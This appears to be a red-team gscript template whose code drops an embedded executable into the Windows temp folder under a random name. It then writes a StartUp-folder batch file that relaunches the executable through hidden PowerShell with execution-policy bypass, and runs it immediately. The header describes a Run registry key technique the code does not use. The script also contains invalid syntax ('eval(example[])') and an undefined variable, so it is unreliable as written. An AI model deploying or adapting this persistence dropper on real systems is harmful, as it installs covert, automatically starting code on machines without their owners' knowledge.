// Example gscript template
// Title: CurrentVersion Run Persistence
// Author: ahhh
// Purpose: Drop a sample binary and persist it using a CurrentVersion\Run regkey
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1112

//priority:90
//timeout:150

//go_import:os as os
//go_import:github.com/gen0cide/gscript/x/windows as windows

//import:main.exe

function Deploy() {
  console.log("starting execution of Startup Persistence");

  // Prep the sample
  var example = GetAssetAsBytes("main.exe");
  var temppath = os.TempDir();
  var naming = G.rand.GetAlphaString(5);
  naming = naming.toLowerCase();
  var fullpath = temppath+"\\"+naming+".exe";
  var fullpath2 = temppath+"\\"+G.rand.GetAlphaString(5)+".txt";

  // Drop the sample
  console.log("file name: "+ fullpath);
  errors = G.file.WriteFileFromBytes(fullpath, example[0]);
  errors2 = G.file.WriteFileFromString(fullpath2, eval(example[]));
  console.log("errors: "+errors,errors2);

  // Persist the sample
  var cmd = "powershell.exe -NoLogo -WindowStyle hidden -ep bypass " + fullpath;
  var fn2 = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\start.bat";
  G.file.WriteFileFromString(fn2, cmd);
  console.log("persisted the example binary using bat / powershell script in StartUp folder");

  // Execute the sample
  var running = G.exec.ExecuteCommandAsync("powershell", ["-NoLogo", "-WindowStyle", "hidden", "-ep", "bypass", fn]);
  console.log("executed the example binary, errors: "+running[1]);

  console.log("done, deployed binary with startup persistence");
  return true;
}
